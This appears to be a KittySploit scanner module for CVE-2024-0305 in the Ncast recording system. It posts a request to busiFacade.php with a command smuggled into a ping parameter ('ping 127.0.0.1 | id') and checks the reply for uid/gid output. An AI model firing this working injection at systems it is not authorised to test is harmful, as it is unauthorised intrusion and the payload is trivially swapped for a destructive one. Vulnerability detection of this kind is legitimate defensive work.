#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Ncast Yingshi high-definition intelligent recording and playback system is a newly developed audio and vid."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ncast busiFacade - Remote Command Execution Detection',
        'description': 'The Ncast Yingshi high-definition intelligent recording and playback system is a newly developed audio and video recording and playback system. The system has RCE vulnerabilities in versions 2017 and earlier.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'ncast', 'rce', 'ncast_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cxsecurity.com/cveshow/CVE-2024-0305',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-0305',
            'https://vuldb.com/?id.249872',
            'https://vuldb.com/?ctiid.249872',
            'https://github.com/Marco-zcl/POC',
        ],
        'cve': 'CVE-2024-0305',
    }

    def run(self):
        path = '/classes/common/busiFacade.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{"name":"ping","serviceName":"SysManager","userTransaction":false,"param":["ping 127.0.0.1 | id"]}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '#str',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Ncast busiFacade - Remote Command Execution detected', path=path)
            return True
        return False

